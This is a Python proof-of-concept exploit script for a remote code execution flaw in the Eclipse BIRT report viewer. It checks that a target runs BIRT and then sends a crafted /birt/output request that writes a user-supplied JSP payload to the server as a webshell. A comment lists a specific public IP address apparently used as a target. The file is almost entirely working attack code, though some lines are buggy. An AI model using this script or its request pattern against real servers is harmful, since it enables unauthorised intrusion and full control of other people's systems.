#! usr/bin/python3
## 
import requests
import socket
import sys
import argparse
import os
import urllib

# http://14.99.184.178:8080/birt/




def help_msg():
    print("")

def check_host(url):
    url = url+"/birt/"
    if not(url.startswith("http")):
        
        sys.exit("INVALID URL")
    try:
        check = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        sys.exit(f"host not found ")
    if check.status_code < 200 and check.status_code >=300:
        sys.exit("server replied with a invalid response exiting....")


    if "BIRT" in check.text:
        print(f"BIRT is installed installed on host continuing to exploit")
    else:
        sys.exit("BIRT viewer is not installed exiting.....")





def main(url,payload,filename="test.jsp"):
    payload = open("payload.jsp","r")
    payload = urllib.parse.quote(payload.read())
    
    vuln = f"/birt/output?__report=test.rptdesign&sample={payload}&__format=pdf&__overwrite=true&__document=./{filename}"
    exploit = requests.get(url+vuln)
    if exploit.status_code >=200 and exploit.status_code <300:
        print("exploit successfull")
    else:
        sys.exit("the server is not vulnerable")
        
    print(f"goto {url}/birt/{filename.jsp} to access the webshell")
    


# http://14.99.184.178:8080/birt/
## http://localhost:8080/birt-viewer/output?__report=test.rptdesign&sample=my+parameter&__format=pdf&__overwrite=true&__document=./info.jsp

if '__main__' == __name__:
    parser = argparse.ArgumentParser(description='POC for the BIRT RCE exploit')
    parser.add_argument('-u', '--url', help='URL to target with port number\n eg: http://hostname:port/', required=True)
    parser.add_argument('-p', '--payload', help='.jsp payload filename for defining own payload', required=False)
    parser.add_argument('-ip', '--address', help='your own public ip', required=False)
    #parser.add_argument('-e', '--path', help='Path to the webshell on the server', required=False)
    args = parser.parse_args()

    #get the actual arguments 
    url = args.url
    payload = args.payload
    ip = args.address
    
    if payload == None:
        payload = "payload.jsp"
    elif payload != None:
        if not(os.system.exists("./payload.jsp")):
            sys.exit(f"{payload} not found \nplease ensure that the file exists and provide the correct path")
    else:
        print("please enter the name of a existing payload after -p")
        
    
    print(f"url:{url}\npayload:{payload}\nip:{ip}")
    
    check_host(url)
    
    
    
    main(url,payload)
    
